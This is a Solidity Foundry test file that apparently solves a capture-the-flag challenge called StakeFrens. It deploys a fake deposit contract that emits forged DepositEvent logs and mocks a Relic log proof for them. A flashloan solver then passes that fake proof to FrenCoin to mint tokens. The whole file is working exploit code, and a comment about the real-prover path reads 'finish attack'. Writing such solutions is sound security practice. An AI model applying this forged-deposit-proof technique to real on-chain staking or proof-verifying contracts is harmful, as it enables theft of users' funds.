// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {IReliquary} from "relic-sdk/packages/contracts/interfaces/IReliquary.sol";
import {IProver} from "relic-sdk/packages/contracts/interfaces/IProver.sol";
import {Fact, FactSignature} from "relic-sdk/packages/contracts/lib/Facts.sol";
import {FactSigs} from "relic-sdk/packages/contracts/lib/FactSigs.sol";
import {CoreTypes} from "relic-sdk/packages/contracts/lib/CoreTypes.sol";
import {IDepositEvents, IDepositContract} from "../src/interfaces/IDepositContract.sol";
import {FrenPool} from "../src/FrenPool.sol";
import {StakeFrens} from "../src/StakeFrens.sol";
import {FrenCoin} from "../src/FrenCoin.sol";
import {RelicMock} from "./RelicMock.sol";
import {ETHFlashloan} from "./ETHFlashloan.sol";

contract FakeDepositContract is IDepositContract {
    function makeFakeDeposit(
        bytes calldata pubkey,
        bytes calldata withdrawal_credentials,
        bytes calldata amount,
        bytes calldata signature,
        bytes calldata index
    ) external {
        emit DepositEvent(
            pubkey,
            withdrawal_credentials,
            amount,
            signature,
            index
        );
    }

    function deposit(
        bytes calldata ,
        bytes calldata ,
        bytes calldata ,
        bytes32 
    ) external payable {
        revert();
    }

    function get_deposit_count() external pure returns (bytes memory) {
        revert();
    }

    function get_deposit_root() external pure returns (bytes32) {
        revert("DepositContract: deposit value too high");
    }
}

contract Solver is ETHFlashloan {
    function callback(bytes calldata data) internal override {
        (
            FrenCoin coin,
            address creator,
            address prover,
            FrenPool.DepositProof memory proof
        ) = abi.decode(
                data,
                (FrenCoin, address, address, FrenPool.DepositProof)
            );
        coin.showFrenship{value: 16 ether}(creator, prover, proof);
    }

    function solve(
        FrenCoin coin,
        address creator,
        address prover,
        FrenPool.DepositProof calldata proof
    ) external payable {
        assert(msg.value == FLASHLOAN_FEE);
        flashLoan(16 ether, abi.encode(coin, creator, prover, proof));
        coin.transfer(msg.sender, coin.balanceOf(address(this)));
    }
}

contract Solve is RelicMock, Test, IDepositEvents {
    IReliquary constant RELIQUARY =
        IReliquary(0x5E4DE6Bb8c6824f29c44Bd3473d44da120387d08);
    address constant RELIC_MULTISIG =
        0xCCEf16C5ac53714512A5Acce5Fa1984A977351bE;
    address constant RELIC_LOG_PROVER =
        0xED12949e9a2cF4D86a2d0cF930247214Ea84aA4e;

    StakeFrens stakeFrens;
    FrenCoin frenCoin;

    constructor() RelicMock(RELIQUARY, RELIC_MULTISIG) {}

    function setup() public {
        stakeFrens = new StakeFrens();
        frenCoin = stakeFrens.frenCoin();
    }

    function to_little_endian_64(
        uint64 value
    ) internal pure returns (bytes memory ret) {
        ret = new bytes(8);
        bytes8 bytesValue = bytes8(value);
        // Byteswapping during copying to bytes.
        ret[0] = bytesValue[7];
        ret[1] = bytesValue[6];
        ret[2] = bytesValue[5];
        ret[3] = bytesValue[4];
        ret[4] = bytesValue[3];
        ret[5] = bytesValue[2];
        ret[6] = bytesValue[1];
        ret[7] = bytesValue[0];
    }

    function setupMockProof(
        FakeDepositContract fake
    ) internal returns (FrenPool.DepositProof memory proof) {
        bytes32[] memory topics = new bytes32[](1);
        topics[0] = DepositEvent.selector;
        bytes memory pubkey = new bytes(48);
        bytes memory withdrawal_credentials = stakeFrens.pools(address(this)).eth1WithdrawalCredentials();
        uint256 deposit_amount = 16 ether;
        DepositEventData memory deposit = DepositEventData(
            pubkey,
            withdrawal_credentials,
            to_little_endian_64(uint64(deposit_amount / 1 gwei)),
            new bytes(96),
            ""
        );
        CoreTypes.LogData memory log = CoreTypes.LogData(
            address(fake),
            topics,
            abi.encode(deposit)
        );
        bytes memory data = abi.encode(log);
        FactSignature sig = FactSigs.logFactSig(0, 0, 0);
        Fact memory fact = Fact(address(fake), sig, data);
        proof = FrenPool.DepositProof(0, 0, 0, bytes32(0), mockProof(fact));
    }

    function getMockProverAndProof(
        FakeDepositContract fake
    ) internal returns (address prover, FrenPool.DepositProof memory proof) {
        prover = setupMockProver();
        proof = setupMockProof(fake);
    }

    function getRealProverAndProof(
        FakeDepositContract fake
    ) internal returns (address prover, FrenPool.DepositProof memory proof) {
        prover = RELIC_LOG_PROVER;

        bytes memory pubkey = new bytes(48);
        bytes memory withdrawal_credentials = stakeFrens.pools(address(this)).eth1WithdrawalCredentials();
        uint256 deposit_amount = 16 ether;

        // we should broadcast this
        fake.makeFakeDeposit(
            pubkey,
            withdrawal_credentials,
            to_little_endian_64(uint64(deposit_amount / 1 gwei)),
            new bytes(96),
            ""
        );
        // TODO: fetch relic proof and finish attack
    }

    function solve() internal {
        stakeFrens.createPool();
        FakeDepositContract fake = new FakeDepositContract();
        (
            address prover,
            FrenPool.DepositProof memory proof
        ) = getMockProverAndProof(fake);
        Solver solver = new Solver();
        solver.solve{value: solver.FLASHLOAN_FEE()}(frenCoin, address(this), prover, proof);
        uint256 seed = stakeFrens.generate(address(this));
        uint256 amount = uint256(uint128(uint256(keccak256(abi.encode(seed)))));
        uint256 balance = frenCoin.balanceOf(address(this));
        require(balance > amount, "amount too small");
        frenCoin.transfer(address(1), balance - amount);
        require(stakeFrens.verify(seed, amount), "challenge not solved");
    }

    function test() public {
        vm.createSelectFork("mainnet");
        setup();
        solve();
    }
}
